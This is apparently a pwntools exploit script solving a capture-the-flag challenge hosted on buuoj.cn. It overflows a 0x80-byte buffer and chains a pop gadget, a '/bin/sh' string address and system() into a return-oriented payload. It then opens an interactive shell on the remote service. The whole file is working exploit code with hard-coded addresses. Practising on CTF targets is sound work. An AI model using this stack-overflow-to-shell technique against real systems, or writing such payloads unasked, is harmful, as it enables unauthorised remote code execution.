from pwn import *


system_addr = 0x4004C0
bash_addr = 0x600A90
pop_ret = 0x4006b3

r = remote('node5.buuoj.cn', 25875)

payload = b'A' * 0x80 + p64(0) + p64(pop_ret) + p64(bash_addr) + p64(system_addr)

r.sendlineafter('Input:\n', payload)
r.interactive()

